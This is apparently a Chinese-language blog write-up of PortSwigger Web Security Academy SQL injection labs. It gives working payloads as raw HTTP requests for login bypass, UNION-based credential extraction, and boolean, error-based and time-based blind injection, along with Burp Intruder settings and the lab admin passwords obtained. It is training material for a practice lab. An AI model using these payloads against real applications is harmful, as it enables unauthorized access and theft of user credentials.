---
title: PortSwigger-SQL Injection靶场通关记录
published: 2026-07-27T18:00:00
description: sql注入通关记录
tags:
  - 靶场
  - SQL注入
category: 网络安全
draft: false
---

# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

在`category='Food & Drink'`后注入`' OR 1=1 --`

1. 用单引号`'`闭合原字符串；  
2. 用`OR 1=1`注入永真条件；  
3. 用`--`注释掉后续的`AND released=1`，使查询变为`WHERE category='...' OR 1=1`，最终返回所有商品。

```http
https://0af600ae0385371e805044ed0078005f.web-security-academy.net/filter?category=Food+%26+Drink%27or%201=1%20--
```

# Lab: SQL injection vulnerability allowing login bypass

利用SQL注释符 `--`，在登录验证的SQL查询中，使密码校验逻辑失效。通过闭合用户名字段并注释掉后续的 `AND password='...'` 部分，直接让数据库返回指定用户（如 `administrator`）的信息，从而无需正确密码即可登录后台。

```http
csrf=sNSY0MwdmMTx2awLAOYqCnY0B4bOcd80&username=administrator' --&password=1234
```

# Lab: SQL injection attack, querying the database type and version on Oracle

利用Oracle数据库的 `UNION` 注入，通过查询系统动态性能视图 `v$version`，将数据库的详细版本信息回显到页面中。由于应用程序直接将用户输入拼接到SQL语句中，攻击者可以构造恶意payload改变原始查询的逻辑。

- **列数探测**：Oracle的 `UNION` 查询要求前后列数完全一致，必须先通过 `ORDER BY` 或 `UNION SELECT NULL,...` 确定原始查询的列数（本实验为2列）。
    
- **Oracle特殊性**：
    
    - `UNION` 中的 `SELECT` 必须带 `FROM` 子句（不能像MySQL那样直接 `SELECT 1,2`）。
        
    - 版本信息存储在 `v$version` 视图中，字段名为 `banner`。
        
    - `NULL` 用于补齐列数（对齐原始查询的第二列），避免语法报错。
- **注释符使用**：在URL参数中，`--` 后必须跟空格（编码为 `--+` 或 `--%20`），否则容易导致SQL语法错误。

```http
GET /filter?category=Toys+%26+Games' order by 2 --+ HTTP/2

GET /filter?category=Toys+%26+Games' union select banner,null from v$version--+ HTTP/2
```

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

利用MySQL的`UNION`注入，通过内置函数`database()`和`version()`直接获取数据库名称和版本信息。与Oracle不同，MySQL的`UNION SELECT`不需要`FROM`子句，且使用`#`作为单行注释符。

- **列数探测**：`ORDER BY 2`验证原始查询返回2列，为后续`UNION`注入做前置准备。
    
- **MySQL与Oracle的区别**：
    
    - 不需要`FROM`子句：MySQL允许`SELECT database(), version()`不带表名。
        
    - 注释符使用`#`：MySQL专属注释符，后面无需跟空格（URL中需编码为`%23`）。
        
    - 内置函数：`database()`返回当前库名，`version()`返回版本字符串。
        
- **注释符注意**：`#`在URL中必须编码为`%23`，否则会被浏览器当作锚点截断。

```http
GET /filter?category=Corporate+gifts' order by 2 # HTTP/2

GET /filter?category=Corporate+gifts' union select database(),version() # HTTP/2
```

# Lab: SQL injection attack, listing the database contents on non-Oracle databases

利用`UNION`注入，在非Oracle数据库（如MySQL、PostgreSQL等）中，通过查询系统元数据库`information_schema`来获取目标表名和列名，最终定位并提取敏感字段（如用户名、密码），实现登录绕过或数据窃取。该漏洞源于应用程序将用户输入拼接到SQL查询中，且未对返回列数做严格限制。

- **列数探测前置**：使用`ORDER BY 2`验证原始查询返回2列，确保后续`UNION SELECT`列数对齐，避免语法报错。
    
- **非Oracle数据库的标准元数据表**：`information_schema.columns`存储了所有表和列的元信息，通过`table_name`和`column_name`字段可枚举目标表的结构。
    
- **数据提取三步走**：
    
    1. 查表名（如`users_ehgyhi`）  
        `SELECT table_name FROM information_schema.tables`
        
    2. 查列名（如`username_ziprsh`和`password_csmiht`）  
        `SELECT column_name FROM information_schema.columns WHERE table_name='users_ehgyhi'`
        
    3. 查数据  
        `SELECT username_ziprsh, password_csmiht FROM users_ehgyhi`
        
- **注释符使用**：`--+`在URL参数中表示`--`注释符加空格，兼容MySQL/PostgreSQL/SQL Server等主流数据库，避免原始查询尾部残留语法干扰。
    
- **列名对齐技巧**：若原始查询返回2列，且两列均为文本类型，直接用`column_name, null`填充；若数据无法回显，需调整`null`位置探测可回显的列。

```http
GET /filter?category=Gifts' order by 2 --+ HTTP/2

GET /filter?category=Toys+%26+Games' union select column_name,null from information_schema.columns where table_name='users_ehgyhi' --+ HTTP/2

GET /filter?category=Toys+%26+Games' union select username_ziprsh,password_csmiht from users_ehgyhi --+ HTTP/2
```

成功获取管理员密码 `4anuct97wxaeatkdj39j`，完成登录。

# Lab: SQL injection attack, listing the database contents on Oracle

利用Oracle数据库的`UNION`注入，通过查询系统视图`all_tables`和`all_tab_columns`获取当前数据库的所有表名和列名，最终定位并提取敏感数据（用户凭证）。Oracle与其他数据库的核心区别在于元数据视图名称不同（`all_tables`替代`information_schema.tables`，`all_tab_columns`替代`information_schema.columns`），且`UNION SELECT`必须带`FROM`子句。

- **列数探测**：`ORDER BY 2`验证原始查询返回2列，确保`UNION SELECT`列数对齐。
    
- **Oracle元数据视图**：
    
    - `all_tables`：当前用户可访问的所有表，字段`table_name`存储表名。
        
    - `all_tab_columns`：当前用户可访问的所有列，字段`column_name`存储列名，`table_name`用于过滤目标表。
        
- **Oracle大小写敏感**：元数据视图中的表名和列名默认以**大写**存储（如`USERS_QMNFUG`、`USERNAME_UOCVVR`），查询时必须使用大写字符串。
    
- **注释符**：使用`--+`（URL中`+`解析为空格），Oracle不支持`#`注释。
    
- **数据提取**：将目标列名直接填入`UNION SELECT`的对应位置，返回结果回显在页面商品列表中。

```http
GET /filter?category=Tech+gifts' order by 2 --+ HTTP/2

GET /filter?category=Tech+gifts' union select table_name,null from all_tables --+ HTTP/2

GET /filter?category=Tech+gifts' union select column_name,null from all_tab_columns where table_name = 'USERS_QMNFUG' --+ HTTP/2

GET /filter?category=Tech+gifts' union select USERNAME_UOCVVR,PASSWORD_BKVOEE from USERS_QMNFUG --+ HTTP/2
```

成功获取管理员密码`a01edzs2xapbkp9h11w9`

# Lab: SQL injection UNION attack, determining the number of columns returned by the query

在SQL注入中，`UNION`操作符要求前后两个`SELECT`语句返回的列数必须完全一致。通过注入`ORDER BY`或`UNION SELECT NULL`语句，探测原始查询的列数，为后续数据提取做准备。本实验通过递增`ORDER BY`的数值，确定原始查询返回3列。

- **`ORDER BY`探测法**：通过`ORDER BY 1`、`ORDER BY 2`、`ORDER BY 3`递增测试，当`ORDER BY n`不报错且`ORDER BY n+1`报错时，列数即为`n`。
    
- **`UNION SELECT NULL`探测法**：`NULL`可匹配任意数据类型，通过不断增加`NULL`数量，直到页面正常返回，即可确定列数。
    
- **异常判断**：列数不对齐时数据库返回`500 Internal Server Error`，页面显示错误或商品列表消失，以此判断探测是否成功。
    
- **注释符**：`--+`在URL中表示`--`注释符加空格，兼容Oracle、PostgreSQL、SQL Server等主流数据库。

```http
GET /filter?category=Tech+gifts' order by 3 --+ HTTP/2

GET /filter?category=Tech+gifts' union select null,null,null --+ HTTP/2
```

# Lab: SQL injection UNION attack, finding a column containing text

提示：Make the database retrieve the string: 'QMI7Y2'

在确定列数后，通过`UNION SELECT`注入将任意字符串（如`'QMI7Y2'`）回显到页面中，用于探测哪些列可以存储和显示文本数据。该实验结合`ORDER BY`探测列数、`version()`确认数据库类型，最终定位可回显文本的列，验证`UNION`注入的数据回显能力。

- **列数探测**：`ORDER BY 3`确认原始查询返回3列。
    
- **数据库类型确认**：通过`version()`函数返回结果（如`PostgreSQL 12.15`）确认目标为PostgreSQL。
    
- **列类型探测**：使用`null`占位非目标列，将测试字符串（`'QMI7Y2'`）放入不同列位置，观察页面回显位置。
- **逐个替换`NULL`为具体值**：
    
    - 先把`version()`放第1列 → 报错说明第1列不是文本
        
    - 再放第2列 → 不报错说明第2列是文本
        
    - 再放第3列 → 报错说明第3列不是文本  
        这样就能定位哪些列能回显文本数据。
    
- **PostgreSQL特征**：使用`information_schema.tables`系统视图，且`version()`函数直接返回版本字符串。


```http
GET /filter?category=Tech+gifts' order by 3 --+ HTTP/2

GET /filter?category=Tech+gifts' union select null,version(),1111 --+ HTTP/2

GET /filter?category=Tech+gifts' union select null,table_name,null from information_schema.tables --+ HTTP/2

GET /filter?category=Tech+gifts' union select null,'QMI7Y2',null --+ HTTP/2
```

# Lab: SQL injection UNION attack, retrieving data from other tables

在确认原始查询列数和可回显文本列后，通过`UNION SELECT`注入查询数据库系统元数据表（`information_schema.columns`），枚举当前数据库中所有表及列名，定位到存储敏感信息的表（如`users`），再从该表中提取`username`和`password`字段，最终获得管理员凭证完成登录。该实验的核心在于：利用`UNION`注入跨越原始查询的数据范围，直接读取其他业务表的内容。

- **列数对齐**：`ORDER BY 2`确认原始查询返回2列，为后续`UNION`注入做前置准备。
    
- **数据库类型识别**：通过`version()`函数返回的结果确认数据库类型（本实验为PostgreSQL或MySQL，注释符均为`--+`），并据此选择正确的元数据视图（`information_schema.columns`是SQL标准，两者通用）。
    
- **列类型匹配**：使用`null`占位非文本列，将字符串函数（`version()`）放在可回显的文本列上，确保数据能正常显示。
    
- **元数据查询**：
    
    - 查表名：`SELECT table_name FROM information_schema.tables`
        
    - 查列名：`SELECT column_name FROM information_schema.columns WHERE table_name='users'`
        
- **数据提取链**：列数探测 → 数据库指纹 → 元数据枚举 → 敏感数据提取，四步形成标准攻击流程。

```http
GET /filter?category=Pets' order by 2 --+ HTTP/2

GET /filter?category=Pets' union select version(),null --+ HTTP/2

GET /filter?category=Pets' union select column_name,null from information_schema.columns where table_name='users' --+ HTTP/2

GET /filter?category=Pets' union select username,password from users --+ HTTP/2
```

成功获取管理员密码`oodin58n8y6vuy80dq12`

# Lab: SQL injection UNION attack, retrieving multiple values in a single column

当原始查询中**只有一列支持文本数据回显**时，通过数据库的字符串拼接函数将多个字段（如`username`和`password`）合并为单个字符串，放入该文本列中，实现单列提取多个敏感数据。本实验在确认列数（2列）、列类型（第1列为数字、第2列为文本）、数据库类型（MySQL）后，使用`concat()`函数将`username`和`password`拼接为`username:password`格式，成功回显管理员凭证。

- **列数探测**：`ORDER BY 2`确认原始查询返回2列。
    
- **列类型探测**：`SELECT 1111,null`通过（第1列为数字），`SELECT null,version()`通过（第2列为文本），定位唯一可回显文本的列为第2列。
    
- **数据库类型识别**：通过`version()`函数返回的版本字符串确定数据库类型（本实验为PostgreSQL，但`version()`在Mysql中同样可用，需结合注释符或后续元数据查询进一步区分）。
    
- **拼接函数选择（重要）**：
    

|     数据库类型      |                   拼接方式                    |                    示例（`username` + `:` + `password`）                     |
| :------------: | :---------------------------------------: | :----------------------------------------------------------------------: |
|   **MySQL**    | `concat()` 或 `\|\|`（需开启PIPES_AS_CONCAT模式） |                     `concat(username,':',password)`                      |
| **PostgreSQL** |      `\|\|`（标准）**或** `concat()`（函数）       | `username \|\| ':' \|\| password`  <br>或 `concat(username,':',password)` |
|   **Oracle**   |    `\|\|`（标准，推荐）或 `concat()`（仅支持2个参数）     |                    `username \|\| ':' \|\| password`                     |
| **SQL Server** |                `+`（字符串拼接符）                |                       `username + ':' + password`                        |

**`concat()` 的兼容性**：适用于 **MySQL 和 PostgreSQL**。若遇到 Oracle，改用 `||`；若遇到 SQL Server，改用 `+`。

- **元数据查询链**：
    
    - 查所有表：`SELECT table_name FROM information_schema.tables`（非Oracle）
        
    - 查指定表的列：`SELECT column_name FROM information_schema.columns WHERE table_name='users'`
        
- **注释符**：根据数据库类型选择，本实验使用`--+`（通用），若为MySQL也可用`#`。

```http
GET /filter?category=Pets' order by 2 --+ HTTP/2

GET /filter?category=Pets' union select 1111,null --+ HTTP/2

GET /filter?category=Pets' union select null,version() --+ HTTP/2

GET /filter?category=Pets' union select null,table_name from information_schema.tables --+ HTTP/2

GET /filter?category=Pets' union select null,column_name from information_schema.columns where table_name='users' --+ HTTP/2

GET /filter?category=Pets' union select null,concat(username,':',password) from users --+ HTTP/2
```

成功获取管理员密码`x7kr9hqnn8bd098h1b6e`

# Lab: Blind SQL injection with conditional responses

应用程序在Cookie的`TrackingId`参数处存在SQL注入，且根据查询是否返回数据行，页面会显示`Welcome back!`。通过构造布尔条件，利用页面内容的“有/无”差异逐字符提取管理员密码。本实验通过`exists`子查询构造永真/永假条件，盲注确认`users`表存在、`administrator`用户存在、密码长度为20，最终逐位爆破出密码。

- **注入点**：Cookie中的`TrackingId`参数，闭合单引号后拼接SQL条件。
    
- **核心查询结构**：
    
    `SELECT ... FROM ... WHERE TrackingId='<input>' AND [条件]`
    
    注入后整体查询结果取决于`[条件]`的真假，页面是否出现`Welcome back!`作为判断依据。
    
- **函数选择说明**：
    
    - **`exists()`**：用于验证子查询是否返回行。当`select 1 from users`能查到数据时，`exists`返回真，页面出现`Welcome back!`。该函数只关心“有没有行”，不关心具体数据，最适合布尔盲注的场景。
        
    - **`substr(password, 1, 1)`**：字符串截取函数，用于逐位提取密码字符。第一位参数是目标字符串，第二个是起始位置，第三个是长度（通常为1）。本实验使用`substr(password, [位置], 1)`依次提取密码的每一位。
        
    - **`ascii()`**：将字符转换为ASCII码，便于在Burp Intruder中使用**数字范围**（如48-122）进行爆破，而非直接猜测字母。ASCII码的有序性使爆破更可控、更精准。
        
- **二分法解释**：
    
    - **原理**：利用ASCII码的数字有序性，通过“大于/小于”判断缩小范围，而非逐值尝试。
        
    - **传统单值尝试**：对每个位置，从32到126逐个尝试ASCII码（最坏需95次请求）。
        
    - **二分法**：每次用`ascii(substr(password, $1$, 1)) > $2$`判断，将搜索范围对半劈开。
        
        - 范围初始为`[32, 126]`。
            
        - 第一次猜测中点`(32+126)/2 = 79`，若条件为真，说明ASCII码 > 79，范围缩小至`[80, 126]`。
            
        - 第二次猜测中点`(80+126)/2 = 103`，依此类推。
            
        - **仅需约7次请求**（log₂(95) ≈ 7）即可确定一个字符，远快于95次逐值尝试。
            
    - **优势**：在盲注场景中，请求响应时间与网络延迟影响巨大，二分法将每次请求数从95次降至7次，效率提升超过10倍。
        
- **Burp Intruder配置**：
    
    - Payload位置1：数值1-20（密码长度，在本实验中确定为20）
        
    - Payload位置2：ASCII码范围48-57（数字0-9）、65-90（A-Z）、97-122（a-z），或使用二分法逐步逼近
        
    - `Grep - Match`添加`Welcome back!`作为成功标记
        
    - 攻击类型：**Cluster bomb**（两个payload位置同步遍历）

该实验使用的遍历，并未使用二分法，仅作为知识点。

```
GET /filter?category=Gifts HTTP/2
Host: 0aa900f103c8d7f484d60ce7002100a5.web-security-academy.net
Cookie: TrackingId=95NO7jceideAOUq3' and 1=1 --+; session=c7XYWqtAfbejsrnUM1UcV3MQfD1okoCg

GET /filter?category=Gifts HTTP/2
Host: 0aa900f103c8d7f484d60ce7002100a5.web-security-academy.net
Cookie: session=c7XYWqtAfbejsrnUM1UcV3MQfD1okoCg; TrackingId=95NO7jceideAOUq3' order by 1 --+

GET /filter?category=Gifts HTTP/2
Host: 0aa900f103c8d7f484d60ce7002100a5.web-security-academy.net
Cookie: TrackingId=95NO7jceideAOUq3' and exists(select 1 from users) --+; session=c7XYWqtAfbejsrnUM1UcV3MQfD1okoCg

GET /filter?category=Gifts HTTP/2
Host: 0aa900f103c8d7f484d60ce7002100a5.web-security-academy.net
Cookie: TrackingId=95NO7jceideAOUq3' and exists(select 1 from users where username='administrator') --+; session=c7XYWqtAfbejsrnUM1UcV3MQfD1okoCg

GET /filter?category=Gifts HTTP/2
Host: 0aa900f103c8d7f484d60ce7002100a5.web-security-academy.net
Cookie: TrackingId=95NO7jceideAOUq3' and exists(select 1 from users where username='administrator' and length(password)=20) --+; session=c7XYWqtAfbejsrnUM1UcV3MQfD1okoCg

GET /filter?category=Gifts HTTP/2
Host: 0aa900f103c8d7f484d60ce7002100a5.web-security-academy.net
Cookie: session=c7XYWqtAfbejsrnUM1UcV3MQfD1okoCg; TrackingId=95NO7jceideAOUq3' and exists(select 1 from users where username='administrator' and ascii(substr(password,$1$,1))=$1$) --+
```

成功获得管理员密码`pbl7xgzcvef5ncdilz3e`

# Lab: Blind SQL injection with conditional errors

应用程序在Cookie的`TrackingId`参数处存在SQL注入，且页面既不回显数据内容，也不显示具体报错信息，但**当SQL语句发生运行时错误（如除零）时，应用程序返回HTTP 500状态码**。通过构造条件语句，当条件为真时触发`1/0`除零错误导致500响应，条件为假时正常返回200响应，利用状态码差异逐字符提取数据。该方法属于**条件报错盲注（Conditional Error-based Blind SQL Injection）**。

- **注入点**：Cookie中的`TrackingId`参数，闭合单引号后通过`||`拼接子查询。
    
- **数据库类型**：本实验为Oracle，使用`dual`虚拟表和`||`字符串拼接符。
    
- **报错触发机制**：`to_char(1/0)`在Oracle中触发除零错误（`ORA-01476: divisor is equal to zero`），导致应用程序返回500状态码。
    
- **核心查询结构**：
    
    `SELECT ... FROM ... WHERE TrackingId='<原值>'||(子查询)||''`
    
    通过`CASE WHEN`控制子查询返回值：真时触发除零，假时返回空字符串。
    
- **函数选择说明**：
    
    - **`to_char(1/0)`**：Oracle中触发除零错误的常用写法，返回`ORA-01476`错误。
        
    - **`CASE WHEN ... THEN ... ELSE ... END`**：条件判断结构，真时执行`to_char(1/0)`，假时返回空字符串。
        
    - **`substr(password, $1$, 1)`**：逐位提取密码字符（第一位参数是位置，第二个是起始位置，第三个是长度）。
        
- **爆破配置**（不使用ASCII码）：
    
    - **Payload位置1（`$1$`）**：数字范围1-20（密码长度），类型`Numbers`
        
    - **Payload位置2（`'$1$'`）**：字符列表（如`a-z0-9`），类型`Simple list`，**注意需要带单引号**，因为比较的是字符串而非ASCII码
        
    - **攻击类型**：`Cluster bomb`
        
    - **判断依据**：HTTP状态码500（真）vs 200（假），可通过Burp的`Grep - Match`或状态码排序筛选
        
- **Oracle注释符**：使用`--`（后面需跟空格，URL中写`--+`）

```
GET /filter?category=Gifts HTTP/2
Host: 0a7400d703b9704080b81c3c000a003c.web-security-academy.net
Cookie: TrackingId=1XwuRh9k8Eeoymjk'; session=lETVwWNcEgNU5CoRlFz6o8fmpFPgKHML

GET /filter?category=Gifts HTTP/2
Host: 0a7400d703b9704080b81c3c000a003c.web-security-academy.net
Cookie: TrackingId=1XwuRh9k8Eeoymjk''; session=lETVwWNcEgNU5CoRlFz6o8fmpFPgKHML

GET /filter?category=Gifts HTTP/2
Host: 0a7400d703b9704080b81c3c000a003c.web-security-academy.net
Cookie: TrackingId=1XwuRh9k8Eeoymjk' --; session=lETVwWNcEgNU5CoRlFz6o8fmpFPgKHML

GET /filter?category=Gifts HTTP/2
Host: 0a7400d703b9704080b81c3c000a003c.web-security-academy.net
Cookie: TrackingId=1XwuRh9k8Eeoymjk' order by 1'; session=lETVwWNcEgNU5CoRlFz6o8fmpFPgKHML

GET /filter?category=Gifts HTTP/2
Host: 0a7400d703b9704080b81c3c000a003c.web-security-academy.net
Cookie: TrackingId=1XwuRh9k8Eeoymjk'||(select case when (1=1) then to_char(1/0) else '' end from dual)||'; session=lETVwWNcEgNU5CoRlFz6o8fmpFPgKHML

GET /filter?category=Gifts HTTP/2
Host: 0a7400d703b9704080b81c3c000a003c.web-security-academy.net
Cookie: TrackingId=1XwuRh9k8Eeoymjk'||(select case when (1=1) then to_char(1/0) else '' end from dual)||'; session=letvwwncegnu5corlfz6o8fmpfpgkhml: 

GET /filter?category=Gifts HTTP/2
Host: 0a7400d703b9704080b81c3c000a003c.web-security-academy.net
Cookie: TrackingId=1XwuRh9k8Eeoymjk'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'
; session=letvwwncegnu5corlfz6o8fmpfpgkhml: 

GET /filter?category=Gifts HTTP/2
Host: 0a7400d703b9704080b81c3c000a003c.web-security-academy.net
Cookie: TrackingId=1XwuRh9k8Eeoymjk'||(select case when length(password)>19 then to_char(1/0) else '' end from users where username='administrator')||'; session=lETVwWNcEgNU5CoRlFz6o8fmpFPgKHML


GET /filter?category=Gifts HTTP/2
Host: 0a7400d703b9704080b81c3c000a003c.web-security-academy.net
Cookie: TrackingId=1XwuRh9k8Eeoymjk'||(select case when substr(password,$1$,1)='$1$' then to_char(1/0) else '' end from users where username='administrator')||'; session=lETVwWNcEgNU5CoRlFz6o8fmpFPgKHML
```

成功获得管理员密码`prnejgqs0t2uf1pbboxr`

# Lab: Visible error-based SQL injection

应用程序未对数据库错误信息进行屏蔽，将详细的SQL报错（如类型转换异常）直接返回到HTTP响应中。攻击者利用`CAST()`或类型转换函数，构造一个将查询结果强制转换为不兼容数据类型（如`int`）的语句。当查询返回的数据（如字符串`username`）无法转换为数字时，数据库抛出类型转换错误，并在报错信息中**直接泄露该数据本身**，从而无需任何盲注即可提取敏感信息。

- **注入点**：Cookie中的`TrackingId`参数。
    
- **数据库类型**：通过报错信息和`LIMIT 1`语法确认目标为**PostgreSQL**（或MySQL，但本实验使用`LIMIT`且`CAST`语法兼容，结合报错特征确认为PostgreSQL）。Oracle不支持`LIMIT`，若为Oracle需改用`ROWNUM=1`。
    
- **报错触发机制**：
    
    - **`CAST()`函数**：用于类型转换。`CAST(数据 AS int)`如果数据包含非数字字符，会触发类型转换错误。
        
    - **`1=CAST(...)`**：确保整个表达式返回布尔值，满足`AND`操作符的语法要求。直接写`AND CAST(...)`会报错"AND条件必须为布尔表达式"，需改为`AND 1=CAST(...)`。
        
- **子查询限制**：`users`表中存在多个用户，直接`SELECT username from users`会返回多行，导致子查询报错"more than one row"。必须使用`LIMIT 1`限制返回单行，避免多行异常干扰数据提取。
    
- **错误信息泄露过程**：当`CAST((SELECT password FROM users LIMIT 1) AS int)`执行时，PostgreSQL尝试将`password`字符串（如`prnejg...`）转为整数，转换失败并抛出类似`invalid input syntax for type integer: "prnejg..."`的错误，密码直接出现在报错信息中。

```
GET /filter?category=Gifts HTTP/2
Host: 0aa600d40308c80782092e1100110096.web-security-academy.net
Cookie: TrackingId=sC5Oy6K0ck4uz9Em'; session=VLKvv99esdSN1UkJrMgAAaHvFZqhzxnk

GET /filter?category=Gifts HTTP/2
Host: 0aa600d40308c80782092e1100110096.web-security-academy.net
Cookie: TrackingId=sC5Oy6K0ck4uz9Em' --+; session=VLKvv99esdSN1UkJrMgAAaHvFZqhzxnk

GET /filter?category=Gifts HTTP/2
Host: 0aa600d40308c80782092e1100110096.web-security-academy.net
Cookie: TrackingId=sC5Oy6K0ck4uz9Em' AND CAST((SELECT 1) AS int) --+; session=VLKvv99esdSN1UkJrMgAAaHvFZqhzxnk

GET /filter?category=Gifts HTTP/2
Host: 0aa600d40308c80782092e1100110096.web-security-academy.net
Cookie: TrackingId=sC5Oy6K0ck4uz9Em' AND 1=CAST((SELECT 1) AS int) --+; session=VLKvv99esdSN1UkJrMgAAaHvFZqhzxnk

GET /filter?category=Gifts HTTP/2
Host: 0aa600d40308c80782092e1100110096.web-security-academy.net
Cookie: TrackingId=sC5Oy6K0ck4uz9Em' AND 1=CAST((SELECT username from users) AS int) --+; session=VLKvv99esdSN1UkJrMgAAaHvFZqhzxnk

GET /filter?category=Gifts HTTP/2
Host: 0aa600d40308c80782092e1100110096.web-security-academy.net
Cookie: TrackingId=' AND 1=CAST((SELECT username from users) AS int) --+; session=VLKvv99esdSN1UkJrMgAAaHvFZqhzxnk

GET /filter?category=Gifts HTTP/2
Host: 0aa600d40308c80782092e1100110096.web-security-academy.net
Cookie: TrackingId=' AND 1=CAST((SELECT username from users limit 1) AS int) --+; session=VLKvv99esdSN1UkJrMgAAaHvFZqhzxnk

GET /filter?category=Gifts HTTP/2
Host: 0aa600d40308c80782092e1100110096.web-security-academy.net
Cookie: TrackingId=' AND 1=CAST((SELECT password from users limit 1) AS int) --+; session=VLKvv99esdSN1UkJrMgAAaHvFZqhzxnk
```

成功获取管理员密码`31fa0hbgzg8yvzhmv7mu`

# Lab: Blind SQL injection with time delays

当页面**既不回显数据，也不显示报错，且无论条件真假页面内容完全一致**时，无法使用布尔盲注或报错注入。此时通过构造条件触发数据库延时函数（如`pg_sleep`），根据响应时间的“长/短”差异，逐字符推断数据库内容。本实验使用PostgreSQL，注入点位于`Cookie: TrackingId`，通过`||`拼接子查询，利用`CASE WHEN`条件触发`pg_sleep(5)`延时。

- **注入点**：Cookie中的`TrackingId`参数，闭合单引号后通过`||`拼接子查询。
    
- **数据库类型**：PostgreSQL（使用`pg_sleep`函数和`||`拼接符）。
    
- **与布尔盲注的核心区别**：判断依据从“页面内容变化”（`Welcome back`）变为“**响应时间是否出现延迟**”（5秒以上）。
    
- **为什么用`||`而不用`AND`**：`pg_sleep()`返回`void`（空值），**不是布尔类型**，无法放在`AND`后面（会报`argument of AND must be type boolean`）。`||`是字符串拼接符，只负责执行表达式，不检查返回值类型，因此能触发延时副作用。
    
- **核心查询结构**：
    
    `TrackingId='原值' || (select case when (条件) then pg_sleep(5) else null end) || '' --+`
    
    - `CASE WHEN`：条件真时执行`pg_sleep(5)`触发延时，假时返回`null`（无延时）。
        
    - `--+`：注释掉原始SQL尾部可能存在的`AND`或`ORDER BY`等条件。
        
- **Payload配置说明**：
    
    - **判断表存在**：`exists(select 1 from users)`。
        
    - **提取用户名**：`substr((select username from users limit 1), 位置, 1) = '字符'`（直接比较字符，Payload2需带引号）。
        
    - **提取密码**：`substr(password, 位置, 1) = '字符' from users where username='administrator'`。
        
- **Burp Intruder配置（字符比较法）**：
    
    - **Payload位置1（`$1$`）**：`Numbers`类型，From=1, To=20（密码长度），Step=1。
        
    - **Payload位置2（`$2$`）**：`Simple list`类型，列表内容为`a-z`、`0-9`等字符（**不带引号**，因为Payload模板中已写为`='$2$'`）。
        
    - **Attack type**：`Cluster bomb`。
        
    - **判断依据**：观察响应时间，**延迟≥5秒的请求即为命中**（无需设置Grep匹配）。

```
GET /filter?category=Gifts HTTP/2
Host: 0a22008a04dc89fa816ea75b006d00d6.web-security-academy.net
Cookie: TrackingId=IKM8YAkEN4ds0nRa' || pg_sleep(5) --+; session=r9jziLFcxIOwUf6IYt4hxNfdB2EZlG3S

GET /filter?category=Gifts HTTP/2
Host: 0ab100d303ea104d8054878c00c3005c.web-security-academy.net
Cookie: TrackingId=uqK29I03qIMipfLs'|| (select case when exists(select 1 from users) then pg_sleep(5) else pg_sleep(0) end) --+; session=9nSSnHXLWTNPNIM70tCeYSarHkKCfwU2

GET /filter?category=Gifts HTTP/2
Host: 0ab100d303ea104d8054878c00c3005c.web-security-academy.net
Cookie: TrackingId=uqK29I03qIMipfLs'|| (select case when substr((select username from users limit 1),$1$,1)='$1$' then pg_sleep(5) else pg_sleep(0) end) --+; session=9nSSnHXLWTNPNIM70tCeYSarHkKCfwU2

GET /filter?category=Gifts HTTP/2
Host: 0ab100d303ea104d8054878c00c3005c.web-security-academy.net
Cookie: TrackingId=uqK29I03qIMipfLs'|| (select case when substr((select password from users limit 1),$1$,1)='$1$' then pg_sleep(5) else pg_sleep(0) end) --+; session=9nSSnHXLWTNPNIM70tCeYSarHkKCfwU2
```

成功获取管理员密码`hefr2001irvg49gna485`

# Lab: Blind SQL injection with time delays and information retrieval

应用程序在Cookie的`TrackingId`参数处存在SQL注入，且页面**既不回显数据，也不显示报错，无论条件真假页面内容完全一致**。通过构造条件触发数据库延时（`pg_sleep(5)`），利用响应时间差异逐字符提取敏感信息。本实验使用PostgreSQL，通过`||`拼接子查询，结合`CASE WHEN`条件判断，成功获取管理员密码

- **入点**：Cookie中的`TrackingId`参数，闭合单引号后通过`||`拼接子查询。
    
- **数据库类型**：PostgreSQL（使用`pg_sleep`延时函数和`||`拼接符）。
    
- **时间盲注判断依据**：响应时间是否延迟5秒（真条件） vs 立即返回（假条件）。
    
- **为什么用`||`而不用`AND`**：`pg_sleep()`返回`void`（空值），不是布尔类型，无法放在`AND`后面。`||`是字符串拼接符，只负责执行表达式，不检查返回值类型，因此能触发延时副作用。
    
- **攻击链（四步走）**：
    
    1. 验证时间盲注存在：`' || pg_sleep(5) --+`
        
    2. 验证`users`表存在：`exists(select 1 from users)`
        
    3. 验证`administrator`用户存在：`exists(select 1 from users where username='administrator')`
        
    4. 探测密码长度：`length(password) > 19`（逐次调整数值）
        
    5. 逐字符爆破密码：`substr((select password from users where username='administrator'), §1§, 1) = '§2§'`
        
- **Burp Intruder配置**：
    
    - Payload1（位置）：`Numbers`，From=1, To=20（密码长度），Step=1
        
    - Payload2（字符）：`Simple list`，列表内容为`a-z`、`0-9`（**不带引号**）
        
    - Attack type：`Cluster bomb`
        
    - 判断依据：响应时间≥5秒的请求即为命中

```
GET /filter?category=Gifts HTTP/2
Host: 0a22008a04dc89fa816ea75b006d00d6.web-security-academy.net
Cookie: TrackingId=IKM8YAkEN4ds0nRa' || pg_sleep(5) --+; session=r9jziLFcxIOwUf6IYt4hxNfdB2EZlG3S

GET /filter?category=Gifts HTTP/2
Host: 0a22008a04dc89fa816ea75b006d00d6.web-security-academy.net
Cookie: TrackingId=IKM8YAkEN4ds0nRa' || (select case when exists(select 1 from users) then pg_sleep(5) else pg_sleep(0) end) --+; session=r9jziLFcxIOwUf6IYt4hxNfdB2EZlG3S

GET /filter?category=Gifts HTTP/2
Host: 0a22008a04dc89fa816ea75b006d00d6.web-security-academy.net
Cookie: TrackingId=IKM8YAkEN4ds0nRa' || (select case when exists(select 1 from users where username='administrator') then pg_sleep(5) else pg_sleep(0) end) --+; session=r9jziLFcxIOwUf6IYt4hxNfdB2EZlG3S

GET /filter?category=Gifts HTTP/2
Host: 0a22008a04dc89fa816ea75b006d00d6.web-security-academy.net
Cookie: TrackingId=IKM8YAkEN4ds0nRa' || (select case when exists(select 1 from users where username='administrator' and length(password) > 19) then pg_sleep(5) else pg_sleep(0) end) --+; session=r9jziLFcxIOwUf6IYt4hxNfdB2EZlG3S

GET /filter?category=Gifts HTTP/2
Host: 0a22008a04dc89fa816ea75b006d00d6.web-security-academy.net
Cookie: TrackingId=IKM8YAkEN4ds0nRa' || (select case when substr((select password from users where username='administrator'),$1$,1)='$1$' then pg_sleep(5) else pg_sleep(0) end) --+; session=r9jziLFcxIOwUf6IYt4hxNfdB2EZlG3S
```

